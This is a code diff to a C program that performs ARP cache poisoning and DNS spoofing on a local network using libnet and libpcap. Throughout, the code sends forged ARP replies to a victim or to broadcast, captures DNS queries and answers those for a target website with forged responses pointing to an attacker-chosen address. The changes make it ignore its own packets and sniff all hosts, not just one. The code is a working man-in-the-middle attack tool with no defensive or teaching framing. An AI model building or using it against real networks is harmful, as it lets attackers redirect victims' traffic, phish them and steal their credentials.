@@ -15,14 +15,14 @@
 #define COLOR_GREEN "\x1b[32m"
 #define COLOR_RESET "\x1b[0m"
 
-char *interface_name;      // Name of the interface on which sniffing will be done and through which fake packes will be sent eg. "wlo1"
-char *gateway_ip_addr;     // IP address of the gateway eg. "192.168.0.1"
-char *website_to_spoof;    // Website which will be spoffed eg. "www.github.com"
-char *redirect_addr;       // Website url or ip address which will be send instead of the website's eg. "192.168.0.47" or "www.guthib.com"
-uint32_t redirect_ip_addr; // IP address of the redirect_addr
+char *interface_name;        // Name of the interface on which sniffing will be done and through which fake packes will be sent eg. "wlo1"
+char *gateway_ip_addr;       // IP address of the gateway eg. "192.168.0.1"
+char *website_to_spoof;      // Website which will be spoffed eg. "www.github.com"
+char *redirect_addr;         // Website url or ip address which will be send instead of the website's eg. "192.168.0.47" or "www.guthib.com"
+u_long redirect_ip_addr;     // IP address of the redirect_addr
+u_int8_t source_mac_addr[6]; // MAC address of "interface_name"
 
-u_int8_t victim_hw_addr[6] = {0x2c, 0xf0, 0x5d, 0xae, 0xe4, 0x01}; // TODO get this from ip address
-u_int8_t test_hw_addr[6] = {0x2c, 0xf0, 0x5d, 0xae, 0xe4, 0x02};   // TODO get this from ip address
+u_int8_t victim_hw_addr[6] = {0x2c, 0xf0, 0x5d, 0xae, 0xe4, 0x01};
 
 /**
  * Checks whether user provided all arguments and run the program as root.
@@ -58,7 +58,7 @@ void check_prerequisites(int argc, char **argv)
  */
 void *start_arp_poisoning()
 {
-  int jam_all = 0; // TODO change this
+  int jam_all = 0; // TODO change this sa user will pass ip addres of victim or "all"
   libnet_t *ln;
   u_int32_t target_ip_addr, zero_ip_addr;
   u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
@@ -81,6 +81,12 @@ void *start_arp_poisoning()
       jam_all ? bcast_hw_addr : victim_hw_addr, /* ethernet destination */
       ETHERTYPE_ARP,                            /* ethertype            */
       ln);                                      /* libnet context       */
+
+  // Save mac address
+  for (int i = 0; i < 6; i++)
+  {
+    source_mac_addr[i] = src_hw_addr->ether_addr_octet[i];
+  }
 
   printf(COLOR_GREEN "Sending ARP packets..." COLOR_RESET "\n");
   while (1)
@@ -125,6 +131,18 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
   dns_header = (char *)(bytes + ETH_HLEN + LIBNET_IPV4_H + LIBNET_UDP_H);
   dns_query = (char *)(bytes + ETH_HLEN + LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H);
 
+  // Check if this packet was send by this program
+  int was_sent_by_this_program = 1;
+  for (int i = 0; i < 6; i++)
+  {
+    if (eth_header->h_source[i] != source_mac_addr[i])
+    {
+      was_sent_by_this_program = 0;
+    }
+  }
+  if (was_sent_by_this_program)
+    return;
+
   int dns_query_len = strlen(dns_query);
 
   // Extract domain name from dns query
@@ -140,25 +158,29 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
   domain_name[dns_query_len - 1] = '\0';
 
   libnet_t *handler = NULL;
+  printf("DNS query: %s %s\n", domain_name, website_to_spoof);
   u_long requested_ip_addr = libnet_name2addr4(handler, domain_name, LIBNET_RESOLVE);
+  printf("DNS query: %s %s\n", domain_name, website_to_spoof);
+  // u_long requested_ip_addr = redirect_ip_addr;
   int domain_name_matches_website = (strncmp(website_to_spoof, domain_name, strlen(website_to_spoof) - 1) == 0);
   uint16_t dns_id = dns_header[0] << 8 | dns_header[1];
 
   if (domain_name_matches_website)
   {
-    printf("\n");
-    printf("Found a match!\n");
-    printf("DNS query: %s %s\n", domain_name, website_to_spoof);
-    printf("UDP packet length: %d\n", ntohs(udp_header->len));
-    printf("UDP source port: %d\n", ntohs(udp_header->source));
-    printf("UDP destination port: %d\n", ntohs(udp_header->dest));
-    printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&ip_header->saddr));
-    printf("Destination IP: %s\n", inet_ntoa(*(struct in_addr *)&ip_header->daddr));
-    printf("Protocol: %d\n", ip_header->protocol);
-    printf("Requested IP: %s\n", inet_ntoa(*(struct in_addr *)&requested_ip_addr));
+    // printf("\n");
+    // printf("DNS query: %s %s\n", domain_name, website_to_spoof);
+    // printf("UDP packet length: %d\n", ntohs(udp_header->len));
+    // printf("UDP source port: %d\n", ntohs(udp_header->source));
+    // printf("UDP destination port: %d\n", ntohs(udp_header->dest));
+    // printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&ip_header->saddr));
+    // printf("Destination IP: %s\n", inet_ntoa(*(struct in_addr *)&ip_header->daddr));
+    // printf("Protocol: %d\n", ip_header->protocol);
+    // printf("Requested IP: %s\n", inet_ntoa(*(struct in_addr *)&requested_ip_addr));
+    // print ethernet address
+
     requested_ip_addr = redirect_ip_addr;
-    printf("Changing to: %s\n", inet_ntoa(*(struct in_addr *)&requested_ip_addr));
-    printf("DNS ID: %x\n", dns_id);
+    // printf("Changing to: %s\n", inet_ntoa(*(struct in_addr *)&requested_ip_addr));
+    // printf("DNS ID: %x\n", dns_id);
   }
 
   char dns_response[1024];
@@ -208,11 +230,6 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
     exit(1);
   }
 
-  // print ip_header->daddr
-  if (domain_name_matches_website)
-  {
-    printf("Destination IP: %s\n", inet_ntoa(*(struct in_addr *)&ip_header->daddr));
-  }
   libnet_build_ipv4(
       packet_size, // 56 + 20
       0,
@@ -220,11 +237,11 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
       0,
       60,
       IPPROTO_UDP,
-      0, ////insert IP checksum value. have to check later
+      0,
       ip_header->daddr,
       ip_header->saddr,
-      NULL, // insert payload
-      0,    // insert length
+      NULL,
+      0,
       handler,
       ip_ptag);
 
@@ -276,8 +293,7 @@ void *sniff_and_fake_dns_packets()
   pcap_set_timeout(handle, 1000);
   pcap_activate(handle);
   pcap_lookupnet(interface_name, &netp, &maskp, errbuf);
-  // pcap_compile(handle, &fp, "udp dst port 53", 0, maskp);
-  pcap_compile(handle, &fp, "udp dst port 53 and host 192.168.0.38", 0, maskp);
+  pcap_compile(handle, &fp, "udp dst port 53", 0, maskp);
   if (pcap_setfilter(handle, &fp) < 0)
   {
     pcap_perror(handle, "pcap_setfilter()");
